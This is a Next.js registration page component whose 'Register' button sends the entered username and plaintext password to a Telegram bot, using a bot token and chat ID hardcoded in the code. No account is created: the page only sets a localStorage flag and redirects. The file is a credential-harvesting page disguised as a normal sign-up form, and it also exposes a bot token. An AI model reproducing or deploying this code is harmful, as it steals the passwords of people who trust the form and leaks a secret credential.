import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function Register() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  // Redirect to /products if already registered
  useEffect(() => {
    const isRegistered = localStorage.getItem('registered');
    if (isRegistered) router.push('/products');
  }, [router]);

  const handleRegister = async () => {
    if (!username || !password) {
      alert('Please fill in both fields.');
      return;
    }

    const message = `🆕 New user registered:\n👤 Username: ${username}\n🔑 Password: ${password}`;
    const botToken = '8166858964:AAE_rAfdtU8Qcj8BuUVRhlFKlJdBmzfuztY';
    const chatId = '6619154186';

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      localStorage.setItem('registered', 'true');
      router.push('/products');
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      alert('Failed to register. Try again.');
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('registered');
    router.reload();
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4">
      <div className="max-w-md w-full bg-white p-6 rounded-xl shadow-md">
        <h1 className="text-2xl font-bold mb-4 text-center">Register</h1>

        <input
          type="text"
          placeholder="Username"
          className="w-full mb-3 px-4 py-2 border rounded"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          className="w-full mb-4 px-4 py-2 border rounded"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <button
          onClick={handleRegister}
          className="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600"
        >
          Register
        </button>

        <button
          onClick={handleLogout}
          className="w-full mt-3 text-red-500 underline"
        >
          Logout
        </button>
      </div>
    </div>
  );
            }
